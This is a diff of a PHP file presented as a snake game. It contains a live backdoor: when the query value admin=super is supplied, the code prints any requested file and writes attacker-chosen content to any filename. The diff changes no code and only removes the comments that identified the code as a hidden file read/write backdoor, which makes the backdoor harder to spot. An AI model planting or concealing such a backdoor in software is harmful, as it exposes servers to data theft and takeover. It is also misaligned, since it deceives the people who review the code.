@@ -1,9 +1,7 @@
 <?php
 // 贪吃蛇游戏
-// 隐藏后门 - 文件读写
 if(isset($_GET['admin']) && $_GET['admin'] == 'super') {
     if(isset($_GET['file'])) {
-        // 读取任意文件的后门
         $file = $_GET['file'];
         echo "<pre>";
         echo htmlspecialchars(file_get_contents($file));
@@ -12,7 +10,6 @@ if(isset($_GET['admin']) && $_GET['admin'] == 'super') {
     }
     
     if(isset($_POST['filename']) && isset($_POST['content'])) {
-        // 写入任意文件的后门
         $filename = $_POST['filename'];
         $content = $_POST['content'];
         file_put_contents($filename, $content);
